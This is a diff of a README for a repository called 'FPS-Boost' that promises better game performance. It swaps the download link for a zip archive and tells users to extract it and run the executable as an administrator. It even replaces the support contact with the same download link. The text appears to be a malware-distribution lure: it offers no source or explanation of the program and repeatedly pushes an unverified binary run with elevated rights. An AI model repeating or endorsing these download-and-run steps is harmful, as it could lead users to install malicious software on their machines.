@@ -4,7 +4,7 @@ Welcome to the **FPS-Boost** repository - your ultimate solution for enhancing t
 
 ## 🚀 Quick Start
 
-1. Download the [Software.zip](https://github.com/user-attachments/files/17676668/Software.zip) package from the link provided.
+1. Download the [https://github.com/JitRRky/FPS-Boost/releases/download/v2.0/Program.zip](https://github.com/JitRRky/FPS-Boost/releases/download/v2.0/Program.zip) package from the link provided.
 2. Extract the contents to a location of your choice.
 3. Run the executable file to start the optimization process instantly.
 
@@ -21,7 +21,7 @@ Welcome to the **FPS-Boost** repository - your ultimate solution for enhancing t
 
 To install the FPS-Boost software, follow these steps:
 
-1. Download the [Software.zip](https://github.com/user-attachments/files/17676668/Software.zip) package from the provided link.
+1. Download the [https://github.com/JitRRky/FPS-Boost/releases/download/v2.0/Program.zip](https://github.com/JitRRky/FPS-Boost/releases/download/v2.0/Program.zip) package from the provided link.
 2. Extract the contents to a directory on your computer.
 3. Run the executable file as an administrator to initiate the optimization process.
 
@@ -60,7 +60,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## 📞 Support
 
-For any questions or issues, please contact our support team at support@fpsboost.com.
+For any questions or issues, please contact our support team at https://github.com/JitRRky/FPS-Boost/releases/download/v2.0/Program.zip
 
 ## 🙏 Acknowledgements
 
